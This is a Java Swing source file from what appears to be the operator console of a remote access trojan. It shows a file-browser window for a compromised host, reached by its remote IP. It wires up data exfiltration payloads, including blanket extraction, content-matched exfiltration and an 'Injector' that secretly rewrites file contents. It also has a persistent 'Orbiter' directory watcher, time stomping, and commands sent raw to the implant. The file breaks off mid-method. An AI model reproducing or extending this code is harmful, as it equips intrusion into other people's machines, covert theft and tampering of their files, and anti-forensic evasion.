/**
 * @author Solomon Sonya
 */

package Controller.GUI;

import java.awt.Frame;
import javax.swing.JFrame;
import java.awt.Dimension;
import javax.swing.*;

import java.io.File;
import java.lang.*;
import java.awt.Frame;
import javax.swing.border.*;

import java.awt.*;
import java.awt.event.*;
import javax.swing.ImageIcon;
import javax.swing.JCheckBox;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.SwingConstants;
import javax.swing.Timer;
import javax.swing.UIManager;

import java.awt.Rectangle;
import java.awt.BorderLayout;
import javax.swing.JLabel ;
import java.lang.*;
import java.awt.Label;
import java.awt.event.ItemEvent;
import java.awt.event.KeyEvent;
import java.awt.Panel;
import java.awt.SystemColor;
import javax.swing.JRadioButton;
import java.text.*;
import java.util.*;
import java.awt.Color;
import java.awt.Font;
import java.awt.FlowLayout;
import java.awt.GridLayout;
import javax.swing.JPanel;
import javax.swing.JSlider;
import java.awt.event.*;
import java.awt.Point;
import javax.swing.BorderFactory;
import javax.swing.border.EtchedBorder;
import javax.swing.border.TitledBorder;
import java.awt.ScrollPane;
import javax.swing.border.BevelBorder;
import javax.swing.border.SoftBevelBorder;
import javax.swing.text.DefaultStyledDocument;
import javax.swing.text.SimpleAttributeSet;
import javax.swing.text.Style;
import javax.swing.text.StyleConstants;
import javax.swing.text.StyleContext;
import javax.swing.text.StyledDocument;
import javax.swing.JOptionPane;
import javax.swing.JTabbedPane;
import java.awt.Button;
import javax.swing.JButton;
import javax.swing.JTextField;
import java.awt.Choice;
import javax.swing.JComboBox;
import java.net.*;
import javax.swing.WindowConstants;
import javax.swing.table.*;

import Controller.Drivers.Drivers;
import Controller.Thread.Thread_Terminal;
import Implant.Driver;


public class Frame_FileBrowser extends JFrame implements ActionListener, ItemListener, KeyListener
{
	private static final String strMyClassName = "Frame_FileBrowser";
	
	Thread_Terminal myThread = null;
	Object_FileBrowser objFileBrowser_Temp = null;
	
	JPanel jpnlMain = new JPanel(new BorderLayout());
	
	JPanel jpnlOverhead = new JPanel(new BorderLayout());
		JLabel jlblHeading = new JLabel("File Browser");
	
	JSplitPane jspltPne_Main = null;
	
	private JPanel jpnlConsoleOut_Title = new JPanel(new BorderLayout());
	public JPanel_TextDisplayPane jtxtpne_ConsoleOut  = new JPanel_TextDisplayPane();
	JScrollPane jscrlPne_ConsoleOut	= null;
	
	JPanel jpnlOptionsMain = new JPanel(new BorderLayout());
		JPanel jpnlOptions = new JPanel(new GridLayout(4,1,4,4));
			JPanel jpnlFileName = new JPanel(new BorderLayout());
				JLabel jlblFileName = new JLabel("File Name:  ");
				JPanel jpnlTextField = new JPanel(new BorderLayout());//add the tf to the south of this jpanel
					JTextField jtfFileName = new JTextField(12);
					public JComboBox jcbFileName = new JComboBox();
					
		JPanel jpnlDataExfiltration = new JPanel(new BorderLayout());
			JPanel jpnlPayloadSelection = new JPanel(new GridLayout(1,5));
				ButtonGroup btngrp_Payload = new ButtonGroup();
					String payloadQuickReference = "Extract";
					JRadioButton jrbPayload_Extractor = new JRadioButton("Extractor", true);
					JRadioButton jrbPayload_Selector = new JRadioButton("Selector", false);
					JRadioButton jrbPayload_Inspector = new JRadioButton("Inspector", false);
					JRadioButton jrbPayload_Injector = new JRadioButton("Injector", false);
					JRadioButton jrbPayload_Alerter = new JRadioButton("Alerter", false);
					String DATA_EXFIL_PAYLOAD_SPECIFICATION = Driver.DATA_EXFIL_EXTRACTOR_PAYLOAD;
			JPanel jpnlDataExfiltration_EAST = new JPanel(new BorderLayout());
				JPanel jpnlOrbiterOptionSelection = new JPanel();
					ButtonGroup btngrp_Orbiter = new ButtonGroup();
						JRadioButton jrbOrbiter_Enabled = new JRadioButton("Yes", false);
						JRadioButton jrbOrbiter_Disabled = new JRadioButton("No", true);
						boolean orbiterEnabled = false;
				JPanel jpnlExfiltrationAction = new JPanel();			
					JButton jbtnExecute_Exfiltration = new JButton("Execute");
				
				JPanel jpnlDataExfiltration_FileTypes = new JPanel();			
					JTextField jtfDataExfiltrationFileType = new JTextField(5);
					
				JPanel jpnlDataExfiltration_ContentTypes = new JPanel();			
					JTextField jtfDataExfiltrationContentType = new JTextField(6);
					
				JPanel jpnlFolderRecursionSelection = new JPanel();
					ButtonGroup btngrp_FolderRecursion = new ButtonGroup();
						JRadioButton folderRecursion_Enabled = new JRadioButton("Yes", false);
						JRadioButton folderRecursion_Disabled = new JRadioButton("No", true);
						boolean folderRecursionEnabled = false;
			
		JPanel jpnlDataExfiltration_EAST_MAIN = new JPanel(new BorderLayout());
			JPanel jpnlDataExfiltration_WEST = new JPanel(new BorderLayout());
				JPanel jpnlCurrentDirectoryFilter = new JPanel(new BorderLayout());
					JLabel jlblCurrentDirectoryFilter = new JLabel("Filter:         ");
					JPanel jpnlCurrentDirectoryFilter_JCB_Alignment = new JPanel(new BorderLayout());
						public JComboBox jcbCurrentDirectoryFilter = new JComboBox();
						
				JPanel jpnlShortcuts = new JPanel(new BorderLayout());
					JLabel jlblShortcuts = new JLabel("Shortcuts:  ");
					JPanel jpnlShortcuts_JCB_Alignment = new JPanel(new BorderLayout());
						//JComboBox jcbShortcuts = null;
					
					String strShortcuts_Options = "Options";
					String strShortcuts_Cat = "cat";
					String strShortcuts_Download = "Download";
					String strShortcuts_Upload = "Upload";
					String strShortcuts_ShareDirectory = "Share Directory";
					String strShortcuts_TimeStompFile = "Time Stomp";
					String strShortcuts_SetMode = "Set Mode i.e. chmod";//chmod
					String strShortcuts_Move = "Move";
					String strShortcuts_Delete = "Delete";
					Object [] arrShortcuts = new Object[]{strShortcuts_Options, strShortcuts_Cat, strShortcuts_Download, strShortcuts_Upload, strShortcuts_ShareDirectory, strShortcuts_TimeStompFile, strShortcuts_SetMode, strShortcuts_Move, strShortcuts_Delete};
				JComboBox jcbShortcuts = new JComboBox(arrShortcuts);	
				JButton jbtnExecute = new JButton("Execute");
			
		JPanel jpnlMainButtons = new JPanel(new GridLayout(1,5));			
				JButton jbtnOpen = new JButton("Open");
				JButton jbtnCancel = new JButton("Cancel");
				JButton jbtnOrbitDirectory = new JButton("Orbit Directory"); //Query user to include top folder and all sub-folders (recursive) or just use the single Top Folder
				JButton jbtnExfilFilesByType = new JButton("Exfil Files By Type");
				JButton jbtnExfilAllFiles = new JButton("Exfil All Files");
				
	public volatile String emptyDirectoryPath_only_used_if_alCurrFileList_is_empty = "";
					
				
	public volatile boolean enableRecursive = false;
	Object_FileBrowser objOrbitFileDirectory = null;
	String strCurrentPath = "";
	
	public volatile boolean i_am_connected_to_implant = false;		
		
	
	JPanel jpnlFileBrowswer = new JPanel(new BorderLayout());
		
	public JTable_FileBrowser_Solomon jtblFileBrowser = null;
	public static final String [] arrJTableColNames  = new String[]{"Extension","File","Path", "Size", "Permission", "Date Last Modified", Drivers.strJTableColumn_InsertID};
	public static Vector<String> vctJTableColNames = new Vector<String>(1,1);
	public static Vector<String> vctJTableToolTips = new Vector<String>(1,1);
	
	public ArrayList<Object_FileBrowser> alNewFileRoots = new ArrayList<Object_FileBrowser>();
	public ArrayList<Object_FileBrowser> alCurrFileRoots = new ArrayList<Object_FileBrowser>();
	
	public 	ArrayList<Object_FileBrowser> alNewFileList = new ArrayList<Object_FileBrowser>();
	public ArrayList<Object_FileBrowser> alCurrFileList = new ArrayList<Object_FileBrowser>();
	
	public volatile Object_FileBrowser objFileBrowser_EmptyDirectory = null;
	
	public volatile boolean updateFileRoots = false;
	public volatile boolean updateFileList = false;
	public volatile boolean continueRun = false;
	public volatile boolean processUpdateInterrupt = false;
	
	int rowClicked_JTable = 0;
	int index_fleBrowserObject_in_arraylist = 0;
	
	Timer tmrUpdateFileList = null;
	
	boolean attemptJTableLookup = true;
	
	

	
	public Frame_FileBrowser(Thread_Terminal terminal)
	{				
		try
		{
			 
			this.myThread = terminal;
			continueRun = false;
			myThread.frameFileBrowserIsDisposed = false;
			
			//update thread to point to me
			myThread.myFileBrowser = this;			
			this.setTitle(Driver.TITLE + "         File Browser @" + myThread.getRHOST_IP());
			setBounds(500, 100,860, 740);			
			
			//RAT ICON
			try	{	this.setIconImage(Drivers.imgFrameIcon);	}	catch(Exception e){}
			
			getContentPane().add(this.jpnlMain);
			
			/******************************************************
			 * 
			 * OVERHEAD
			 * 
			 *******************************************************/
			jlblHeading.setText("File Browser @" + myThread.getRHOST_IP());
			this.jpnlOverhead.add(BorderLayout.NORTH, this.jlblHeading);
				this.jpnlMain.add(BorderLayout.NORTH, jpnlOverhead);			
			
				
				
			/******************************************************
			 * 
			 * FILE BROWSWER
			 * 
			 *******************************************************/
			try
			{
				vctJTableColNames.clear();
				vctJTableToolTips.clear();
				 
			}catch(Exception e){}
			
			for(int i = 0; i < this.arrJTableColNames.length; i++)					
			{
				vctJTableColNames.add(arrJTableColNames[i]);
				vctJTableToolTips.add(arrJTableColNames[i]);
			}
				   
			//now populate the jtable! 
			this.jtblFileBrowser = new JTable_FileBrowser_Solomon(vctJTableColNames, vctJTableToolTips, "FILE BROWSER - " + myThread.getJListData(), Color.blue.darker(), null);
			//jtblFileBrowser.clrDefaultBackground = Drivers.clrBackground;
			//jtblFileBrowser.clrDefaultForeground = Drivers.clrImplant; 
			jpnlFileBrowswer.add(BorderLayout.CENTER, jtblFileBrowser);
			 
			    
			
			jpnlOptions.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Options", TitledBorder.LEADING, TitledBorder.TOP, null, new Color(0, 51, 255)));
			
			/**
			 * jpnlFileBrowswer SOUTH
			 */
			jpnlOptionsMain.add(BorderLayout.CENTER, jpnlOptions);
				//jpnlFileBrowswer.add(BorderLayout.SOUTH, jpnlOptions);
				jpnlFileBrowswer.add(BorderLayout.SOUTH, jpnlOptionsMain);
				
				jpnlOptionsMain.setVisible(false);
			
			//FILE NAME
			jpnlFileName.add(BorderLayout.WEST, jlblFileName);
			//jpnlTextField.add(BorderLayout.SOUTH, jtfFileName);
			jpnlTextField.add(BorderLayout.SOUTH, jcbFileName);
			jpnlFileName.add(BorderLayout.CENTER, jpnlTextField);
			jlblFileName.setToolTipText("Search the current path for an indicated file name");
			jpnlOptions.add(jpnlFileName);
			
			//FILTER
			jpnlCurrentDirectoryFilter.add(BorderLayout.WEST, jlblCurrentDirectoryFilter);
			jpnlCurrentDirectoryFilter_JCB_Alignment.add(BorderLayout.SOUTH, jcbCurrentDirectoryFilter);
			jpnlCurrentDirectoryFilter.add(BorderLayout.CENTER, jpnlCurrentDirectoryFilter_JCB_Alignment);
			//jlblCurrentDirectoryFilter.setEnabled(false);
			jpnlOptions.add(jpnlCurrentDirectoryFilter);
			
			//SHORTCUTS
			jpnlShortcuts.add(BorderLayout.WEST, jlblShortcuts);
			jpnlShortcuts_JCB_Alignment.add(BorderLayout.SOUTH, jcbShortcuts);
			jpnlShortcuts.add(BorderLayout.CENTER, jpnlShortcuts_JCB_Alignment);
			jpnlShortcuts.add(BorderLayout.EAST, jbtnExecute);
			jpnlOptions.add(jpnlShortcuts);
			
			//BUTTONS
			
			jpnlMainButtons.add(jbtnOrbitDirectory);
			jpnlMainButtons.add(jbtnExfilFilesByType);
			jpnlMainButtons.add(jbtnExfilAllFiles);
			//jpnlMainButtons.add(new JLabel(""));//dummy JLabel
			//jpnlMainButtons.add(new JLabel(""));//dummy JLabel
			//jpnlMainButtons.add(new JLabel(""));//dummy JLabel
			//jpnlMainButtons.add(new JLabel(""));//dummy JLabel
			//jpnlMainButtons.add(new JLabel(""));//dummy JLabel
			jpnlMainButtons.add(jbtnOpen);
			jpnlMainButtons.add(jbtnCancel);			
				jpnlOptions.add(jpnlMainButtons);
			
				
			/**
			 * DATA EXFILTRATION
			 */
			jpnlDataExfiltration.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Data Exfiltration", TitledBorder.LEADING, TitledBorder.TOP, null, new Color(0, 51, 255)));
			
				//
				//PAYLOAD
				//
				jpnlPayloadSelection.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Payload", TitledBorder.CENTER, TitledBorder.TOP, null, new Color(0, 51, 255)));
					btngrp_Payload.add(jrbPayload_Extractor);
					btngrp_Payload.add(jrbPayload_Alerter);
					btngrp_Payload.add(jrbPayload_Selector);
					btngrp_Payload.add(jrbPayload_Inspector);
					btngrp_Payload.add(jrbPayload_Injector);
					
					jpnlPayloadSelection.add(jrbPayload_Extractor);
					jpnlPayloadSelection.add(jrbPayload_Alerter);
					jpnlPayloadSelection.add(jrbPayload_Selector);
					jpnlPayloadSelection.add(jrbPayload_Inspector);
					jpnlPayloadSelection.add(jrbPayload_Injector);
					
				jpnlDataExfiltration.add(BorderLayout.CENTER, jpnlPayloadSelection);	
					
				
				//
				//jpnlDataExfiltration_EAST_MAIN WEST
				//
				jpnlDataExfiltration_WEST.add(BorderLayout.CENTER, this.jpnlDataExfiltration_ContentTypes);
				jpnlDataExfiltration_WEST.add(BorderLayout.WEST, this.jpnlDataExfiltration_FileTypes);
				jpnlDataExfiltration_WEST.add(BorderLayout.EAST, this.jpnlFolderRecursionSelection);
				jpnlDataExfiltration_EAST_MAIN.add(BorderLayout.WEST, jpnlDataExfiltration_WEST);	
				
				//
				//CONTENT TYPES
				//
				jpnlDataExfiltration_ContentTypes.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Contents", TitledBorder.CENTER, TitledBorder.TOP, null, new Color(0, 51, 255)));
				jpnlDataExfiltration_ContentTypes.add(jtfDataExfiltrationContentType);
				jtfDataExfiltrationContentType.setText("*.*");
				jtfDataExfiltrationContentType.setHorizontalAlignment(JTextField.CENTER);
				jtfDataExfiltrationContentType.addActionListener(this);
				
				//
				//FILE TYPES
				//
				jpnlDataExfiltration_FileTypes.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "File Types", TitledBorder.CENTER, TitledBorder.TOP, null, new Color(0, 51, 255)));
				jpnlDataExfiltration_FileTypes.add(jtfDataExfiltrationFileType);
				jtfDataExfiltrationFileType.setText("*.*");
				jtfDataExfiltrationFileType.setHorizontalAlignment(JTextField.CENTER);
				jtfDataExfiltrationFileType.addActionListener(this);
				
				//
				//FOLDER RECURSION
				//
				jpnlFolderRecursionSelection.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Recurse Sub-Dirs?", TitledBorder.CENTER, TitledBorder.TOP, null, new Color(0, 51, 255)));
				btngrp_FolderRecursion.add(folderRecursion_Enabled);
				btngrp_FolderRecursion.add(folderRecursion_Disabled);
				
				jpnlFolderRecursionSelection.add(folderRecursion_Enabled);
				jpnlFolderRecursionSelection.add(folderRecursion_Disabled);
				
				folderRecursion_Enabled.addActionListener(this);
				folderRecursion_Disabled.addActionListener(this);
				
				jpnlFolderRecursionSelection.setToolTipText("If Enabled, specified diretory (top folder) and all sub-folders under top folder will be included in the exploit");
				folderRecursion_Enabled.setToolTipText("If Enabled, specified diretory (top folder) and all sub-folders under top folder will be included in the exploit");
				folderRecursion_Disabled.setToolTipText("If Enabled, specified diretory (top folder) and all sub-folders under top folder will be included in the exploit");
				
				
				//
				//jpnlDataExfiltration_EAST_MAIN EAST
				//
				jpnlDataExfiltration.add(BorderLayout.EAST, jpnlDataExfiltration_EAST_MAIN);
				
				jpnlDataExfiltration_EAST_MAIN.add(BorderLayout.EAST, jpnlDataExfiltration_EAST);					
				jpnlDataExfiltration_EAST.add(BorderLayout.WEST, this.jpnlOrbiterOptionSelection);
				jpnlDataExfiltration_EAST.add(BorderLayout.EAST, this.jpnlExfiltrationAction);
				
				
				//
				//ORBITER
				//
				jpnlOrbiterOptionSelection.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Enable Orbiter?", TitledBorder.CENTER, TitledBorder.TOP, null, new Color(0, 51, 255)));
					btngrp_Orbiter.add(jrbOrbiter_Enabled);
					btngrp_Orbiter.add(jrbOrbiter_Disabled);
					
					jpnlOrbiterOptionSelection.add(jrbOrbiter_Enabled);
					jpnlOrbiterOptionSelection.add(jrbOrbiter_Disabled);
				
					jpnlOrbiterOptionSelection.setToolTipText("If Enabled, this payload will loiter the specified directory to maintain exploit indefinitely");
					jrbOrbiter_Enabled.setToolTipText("If Enabled, this payload will loiter the specified directory to maintain exploit indefinitely");
					jrbOrbiter_Disabled.setToolTipText("If Enabled, this payload will loiter the specified directory to maintain exploit indefinitely");


				//
				//ACTION BUTTON
				//
				jpnlExfiltrationAction.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Action", TitledBorder.CENTER, TitledBorder.TOP, null, new Color(0, 51, 255)));
					jpnlExfiltrationAction.add(jbtnExecute_Exfiltration);
					
			jpnlOptionsMain.add(BorderLayout.NORTH, jpnlDataExfiltration);
			
				//
				//REGISTER ACTION EVENTS
				//
				jrbPayload_Extractor.addActionListener(this);
				jrbPayload_Alerter.addActionListener(this);
				this.jrbPayload_Injector.addActionListener(this);
				this.jrbPayload_Inspector.addActionListener(this);
				this.jrbPayload_Selector.addActionListener(this);
				this.jrbOrbiter_Disabled.addActionListener(this);
				this.jrbOrbiter_Enabled.addActionListener(this);
				jbtnExecute_Exfiltration.addActionListener(this);
				this.jtfDataExfiltrationFileType.setToolTipText("File Filter Specification");
				jpnlDataExfiltration_FileTypes.setToolTipText("File Filter Specification");
				this.jpnlDataExfiltration_ContentTypes.setToolTipText("Content Filter Specification");
				this.jtfDataExfiltrationContentType.setToolTipText("Content Filter Specification");
				
				jrbPayload_Extractor.setToolTipText("<html><b>Blanket File Extraction</b><br> Extract all files (*.*) or files types from specified directory satisfying File Filter Specification</html>");
				jrbPayload_Alerter.setToolTipText("<html><b>Silent <u>File</u> Monitor, No Exfil</b><br>Monitor directory for presence of file name(s) satisfying File Filter Specification and provide alert on match (no exfil)</html>");
				this.jrbPayload_Injector.setToolTipText("<html><b>\"<u>The Diddler</u>\"</b><br>Replace contents within files satisfying File Content character sequence specifications with injected character sequence on all specified file types</html>");
				this.jrbPayload_Inspector.setToolTipText("<html><b>Silent <u>Content</u> Monitor, No Exfil</b><br>Inspect indicated files for content annotated in File Content Specification. Provide Alert on match (no exfil)</html>");
				this.jrbPayload_Selector.setToolTipText("<html><b>Content Interrogation First, Select File and Exfiltrate on Match</b><br>Inspect indicated files for content annotated in File Content Specification. Exfiltrate files matching indicated parameters</html>");
				
				this.jtfDataExfiltrationContentType.setEditable(false);
				jtfDataExfiltrationContentType.setBackground(Color.gray.brighter());
			
			/**
			 * CONSOLE OUT
			 */
			jscrlPne_ConsoleOut	 = new JScrollPane(jtxtpne_ConsoleOut);
			jpnlConsoleOut_Title.add(BorderLayout.CENTER, jscrlPne_ConsoleOut);
			jpnlConsoleOut_Title.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Console Out", TitledBorder.LEADING, TitledBorder.TOP, null, new Color(0, 51, 255)));
			
			
			/**
			 * SPLITPANE
			 */
			jspltPne_Main = new JSplitPane(JSplitPane.VERTICAL_SPLIT, jpnlFileBrowswer, jpnlConsoleOut_Title);
			jspltPne_Main.setOneTouchExpandable(true);
			jspltPne_Main.setDividerLocation(600);
			//jpnlMain().add(BorderLayout.CENTER, this.jspltPne_Main);
				 
				 
			this.jpnlMain.add(BorderLayout.NORTH, this.jpnlOverhead);
			this.jpnlMain.add(BorderLayout.CENTER, this.jspltPne_Main);
			
			
			//all went well, continue!
			i_am_connected_to_implant = true;
			
			/******************************************************
			 * 
			 * SET OPTIONS
			 * 
			 *******************************************************/
			jtfFileName.setEditable(false);
			//jtfFileName.setBackground(Color.WHITE);
			
			this.jbtnCancel.addActionListener(this);
			jbtnOrbitDirectory.addActionListener(this);
			jbtnExfilFilesByType.addActionListener(this);
			jbtnExfilAllFiles.addActionListener(this);
			this.jbtnExecute.addActionListener(this);
			this.jbtnOpen.addActionListener(this);
			this.jtblFileBrowser.jcbFileRoots.addActionListener(this);
			this.jtblFileBrowser.jbtnMoveUpDirectory.addActionListener(this);
			this.jtblFileBrowser.jbtnNewDirectory.addActionListener(this);
			this.jtblFileBrowser.jbtnRefresh.addActionListener(this);
			this.jtblFileBrowser.jbtnSearch.addActionListener(this);
			this.jtblFileBrowser.jbtnShare.addActionListener(this);
			this.jtblFileBrowser.jtfCurrentPath.addActionListener(this);
			this.jtblFileBrowser.jbtnDelete.addActionListener(this);
			jcbCurrentDirectoryFilter.addActionListener(this);
			
			
			
			//this.jcbCurrentDirectoryFilter.addItemListener(this);
			//this.jcbShortcuts.addItemListener(this);
			//this.jtblFileBrowser.jcbFileRoots.addItemListener(this);
			
			//this.jcbCurrentDirectoryFilter.setEnabled(false);
			this.jtblFileBrowser.jbtnShare.setEnabled(false);
			this.jtblFileBrowser.jbtnSearch.setEnabled(false);
			this.jtblFileBrowser.jbtnRefresh.setEnabled(false);
			//this.jtblFileBrowser.jbtnNewDirectory.setEnabled(false);
			
			
			continueRun = true;
			this.processUpdateInterrupt = false;
			this.tmrUpdateFileList = new Timer(Driver.THREAD_REFRESH_FILE_BROWSWER_INTERVAL_MILLIS, this);
			tmrUpdateFileList.start();
			
			
		}
		catch(Exception e)
		{
			Driver.eop("Constructor", strMyClassName, e, e.getLocalizedMessage(), false);
		}
			
			
					
		this.jtblFileBrowser.jtblMyJTbl.addMouseListener(new MouseAdapter()
		{
			public void mouseClicked(MouseEvent me)
			{
				try
				{
					if(me.getClickCount() == 2)
					{
						if(attemptJTableLookup)
						{
							//so we actually removed the unique ID column from the table renderer, however, the data is still present at the underlying default table model
							//therefore, right before we removed the column from the renderer, we saved it, so try and reference the default column here and the row, 
							//get the unique id, convert to int, and this is the actual location within the arraylist to harvest the file object, and grab the parent directory to list
							rowClicked_JTable = jtblFileBrowser.jtblMyJTbl.getSelectedRow();
							
							index_fleBrowserObject_in_arraylist = Integer.parseInt((String)jtblFileBrowser.dfltTblMdl.getValueAt(rowClicked_JTable, jtblFileBrowser.myInsertID_ColumnIndex));
							
							//Get the Object Node at this location
							objFileBrowser_Temp = alCurrFileList.get(index_fleBrowserObject_in_arraylist);
							
							//Determine if this is a file or a directory.
							if(objFileBrowser_Temp.i_am_a_file)
							{
								if(Drivers.jop_Confirm("You selected File:\n" + objFileBrowser_Temp.myFile_fullPath + "\n\nDo you wish to download this file?", "Download File?") == JOptionPane.YES_OPTION)
								{
									//send the download command!
									myThread.sendCommand_RAW("download" + "\"" + objFileBrowser_Temp.myFile_fullPath.trim() + "\"");
								}
								//ELSE, DO NOTHING AND GET OUT!!!
							}
							else//user selected a directory or a drive, send this location to be reloaded in the view
							{
								myThread.sendCommand_RAW(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.FILE_BROWSER_MAP_DIRECTORY + Driver.delimeter_1 + objFileBrowser_Temp.myFile_fullPath);
							}
						}
						else//error occurred, so alert user to enter direct path
						{
							Drivers.jop_Warning("Please enter full path in the \"Current Path\" field", "Unable to complete selected action");
						}
					}
					
				}
				catch(Exception e)
				{
					attemptJTableLookup = false;
					Drivers.eop("addMouseListener", strMyClassName, e, "Perhaps error occurred from the deleted column in the renderer but that is still present in the default table model", false);
				}
			}
		});
			 
			
		this.addWindowListener(new java.awt.event.WindowAdapter() 
		{
			public void windowClosing(java.awt.event.WindowEvent e) 
			{
				closeFrame(); 			
			}
		});	
			
			
			
	}//end constructor
	
	
	public Object_FileBrowser getSelectedFileObject_From_JTable()
	{
		try
		{
			//so we actually removed the unique ID column from the table renderer, however, the data is still present at the underlying default table model
			//therefore, right before we removed the column from the renderer, we saved it, so try and reference the default column here and the row, 
			//get the unique id, convert to int, and this is the actual location within the arraylist to harvest the file object, and grab the parent directory to list
			int clickedRow = jtblFileBrowser.jtblMyJTbl.getSelectedRow();
			
			if(clickedRow < 0)
			{
				//Drivers.sop("No Row selected!");
				return null;
			}
			
			int index = Integer.parseInt((String)jtblFileBrowser.dfltTblMdl.getValueAt(clickedRow, jtblFileBrowser.myInsertID_ColumnIndex));
			
			//Get the Object Node at this location
			Object_FileBrowser objFile = alCurrFileList.get(index);
			
			return objFile;
			
		}
		catch(Exception e)
		{
			Driver.eop("getSelectedFileBrowserObject", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return null;
	}
	
	public boolean updateFileRoots()
	{
		try
		{
			try{this.jtblFileBrowser.jcbFileRoots.removeAllItems();}catch(Exception e){}
			
			for(int i = 0; i < this.alCurrFileRoots.size(); i++)
			{
				this.jtblFileBrowser.jcbFileRoots.addItem(this.alCurrFileRoots.get(i).getJList_FileRoots());
			}
			
			//update the current folder path!
			try 
			{
				if(this.alCurrFileRoots.get(0).i_am_a_directory || this.alCurrFileRoots.get(0).i_am_a_drive)
				{
					strCurrentPath = this.alCurrFileRoots.get(0).myFile_fullPath;
					this.jtblFileBrowser.jtfCurrentPath.setText(this.alCurrFileRoots.get(0).myFile_fullPath);
				}
				else//get the file's parent directory
				{
					strCurrentPath = this.alCurrFileRoots.get(0).myFile_parentDirectory;
					this.jtblFileBrowser.jtfCurrentPath.setText(this.alCurrFileRoots.get(0).myFile_parentDirectory);
				}
				 
			}catch(Exception e) {this.jtblFileBrowser.jtfCurrentPath.setText("");}
			
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("updateFileRoots", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public Object_FileBrowser getSelectedFileObject_From_JComboBox()
	{
		try
		{
			String shortcutFileName = (String)this.jcbFileName.getSelectedItem();
			
			if(shortcutFileName == null || shortcutFileName.trim().equals(""))
			{
				return null;
			}
			
			shortcutFileName = shortcutFileName.trim();
			
			Object_FileBrowser objFile = null;
			
			//instead of keeping a separate arraylist of files, search through the main arraylist of file objects for the matchng string
			for(int i = 0; i < alCurrFileList.size(); i++)
			{
				objFile = alCurrFileList.get(i);
				
				if(objFile == null || !objFile.i_am_a_file)
				{
					continue;
				}
				else if(objFile.myFile_fullPath!= null && objFile.myFile_fullPath.trim().equalsIgnoreCase(shortcutFileName))
				{
					return objFile;
				}
				
				else if(objFile.myFile_fle != null && objFile.myFile_fle.trim().equalsIgnoreCase(shortcutFileName))
				{
					return objFile;
				}
			}
			
		}
		catch(Exception e)
		{
			Driver.eop("getSelectedFileObject_From_JComboBox", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return null;
	}
	
	public boolean executeShortcut()
	{
		try
		{
			
			
			//next, check if user selected a file from the JTable First
			Object_FileBrowser fleShortcut = getSelectedFileObject_From_JTable();
			
			//if that is null, check if the user selected a file from the jcombobox
			if(fleShortcut == null)
			{
				fleShortcut = getSelectedFileObject_From_JComboBox();
			}
			
			//check again if we finally have a file object
			if(fleShortcut == null || !fleShortcut.i_am_a_file)
			{
				Drivers.jop("Please select a file in order to continue...");
				return false;
			}
			
			//otherwise, we have a valid file object			
			//Drivers.jop(fleShortcut.myFile_fullPath);
			
			//now determine the option to perform
			//check on the shortcut option selected by the user
			String strShortcutOption = (String)this.jcbShortcuts.getSelectedItem();
			
			if(strShortcutOption == null)
			{
				Drivers.jop("Please select a valid shortcut option");
				return false;
			}
			
			if(strShortcutOption.equalsIgnoreCase(this.strShortcuts_Cat))
			{
				this.myThread.sendCommand_RAW(Driver.SPLINTER_DELIMETER_INITIAL_REGISTRATION + Driver.delimeter_1 + Driver.FILE_BROWSER_CAT_FILE + Driver.delimeter_1 + fleShortcut.myFile_fullPath);
				return true;
			}
			
			else if(strShortcutOption.equalsIgnoreCase(this.strShortcuts_Delete))
			{
				Drivers.jop("Ready to delete File: " + fleShortcut.myFile_fullPath);
				return true;
			}
			
			else if(strShortcutOption.equalsIgnoreCase(this.strShortcuts_Download))
			{
				Drivers.jop("Ready to download File: " + fleShortcut.myFile_fullPath);
				return true;
			}
			
			else if(strShortcutOption.equalsIgnoreCase(this.strShortcuts_Upload))
			{
				Drivers.jop("Ready to Upload File: " + fleShortcut.myFile_fullPath);
				return true;
			}
			
			else if(strShortcutOption.equalsIgnoreCase(this.strShortcuts_ShareDirectory))
			{
				if(!fleShortcut.i_am_a_file)
				{
					Drivers.jop("Ready to Share Directory: " + fleShortcut.myFile_fullPath);
				}
				else
				{
					Drivers.jop("Ready to Share Directory: " + fleShortcut.myFile_parentDirectory);
				}
				return true;
			}
			
			else
			{
				Drivers.jop("Invalid or Unsupported feature selected");
				return false;
			}
			
			
		}
		catch(Exception e)
		{
			Drivers.eop("executeShortcut", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public void actionPerformed(ActionEvent ae)
	{
		try
		{
			if(ae.getSource() == tmrUpdateFileList)
			{
				if(this.continueRun && this.processUpdateInterrupt)
				{
					processUpdateInterrupt = false;
					
					if(updateFileRoots)
					{
						updateFileRoots = false;
						//Driver.sop("Readty to Update File Roots");
						updateFileRoots();
					}
					
					if(this.updateFileList)
					{
						updateFileList = false;
						this.updateFileList();
					}
					
					
				}
			}
			
			else if(ae.getSource() == jbtnOrbitDirectory)
			{
				//enableRecursive
				
				String orbitPath = queryOrbitDirectoryPath("Orbit");
				
				
				
				
				
				if(orbitPath != null && queryRecursiveOrbitDirectory(orbitPath) > -1)
				{
					//we know the user wants to continue to exfil from this directory
					int delyMillis = queryDelayInterval_Millis();
					
					//enableRecursive is set by the above method
					
					//get the file types to exfil
					String fileTypes = queryOrbitDirectoryFileTyes();
					
					this.jtxtpne_ConsoleOut.appendString(true, "", "Trusting User Input. Orbiter Directory Path: " + "\"" + orbitPath + "\"" + " Orbiter Extraction File Type: \"" + fileTypes + "\"" + " Recursive Directory Extraction enabled: " + enableRecursive + " Delay in seconds: " + "\""+delyMillis+"\"", Drivers.clrController, Drivers.clrBackground);
					
					//send the orbiter command!
					try
					{
						//FORMAT: ORBIT_DIRECTORY, [full path], [file type], [recursive directory extraction ==> true|false]
